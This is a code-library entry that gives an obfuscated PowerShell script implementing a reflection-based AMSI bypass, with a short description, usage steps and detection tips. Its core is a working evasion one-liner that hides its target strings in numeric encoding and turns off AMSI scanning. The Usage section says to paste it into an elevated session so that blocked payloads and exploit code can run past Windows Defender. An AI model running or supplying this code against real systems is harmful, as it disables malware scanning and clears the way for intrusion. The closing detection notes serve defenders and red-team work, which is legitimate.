---
id: 5e1763a8-8eca-411b-aaac-d13b1703373f
type: code
language: ps1
verified: true
created_at: '2023-04-06T03:56:26.163173+00:00'
updated_at: '2023-04-10T20:36:17.278132+00:00'
tags:
  - amsi-bypass
  - powershell
  - defense-evasion
  - obfuscated
platforms:
  - Windows
validated: true
---

# PowerShell-Reflection-AMSI-Bypass-Script

## Code

```ps1
$A="5492868772801748688168747280728187173688878280688776828"
$B="1173680867656877679866880867644817687416876797271"
[Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).substring(($_*2),2))})-replace " " ).GetField([string](38..51|%{[char][int](29+($A+$B).substring(($_*2),2))})-replace " " ,'Non' + 'Public,Static').SetValue($null,$true)
```

## Description

This obfuscated PowerShell code implements Matt Graeber's reflection-based AMSI bypass. It decodes strings to reference the System.Management.Automation.AmsiUtils class and sets the non-public static field amsiInitFailed to $true, disabling AMSI scanning for the current PowerShell session. The obfuscation uses numeric string encoding to evade signature-based detection.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | The code is self-contained with no user-defined variables; strings A and B are hardcoded encodings. | N/A |

## Usage

Paste this code directly into an elevated PowerShell session and execute it. Once run, AMSI is bypassed for that session, allowing execution of scripts that would otherwise be blocked (e.g., encoded payloads or exploit code). Use in red team engagements for evading Windows Defender during initial execution or post-exploitation. Reference in procedures like [[procedures/PowerShell-AMSI-Bypass-using-Reflection-and-WMF5-Autologging-Bypass]].

## Detection

- Enable PowerShell Script Block Logging and Module Logging to capture the decoded reflection calls.
- Monitor ETW events for accesses to AmsiUtils or unusual [Ref].Assembly usage.
- Behavioral detection: Look for PowerShell processes setting internal flags without errors post-execution of known malicious content.
- Static analysis: Decode the strings (A+B) to reveal 'System.Management.Automation.AmsiUtils' and 'amsiInitFailed' for signature matching.
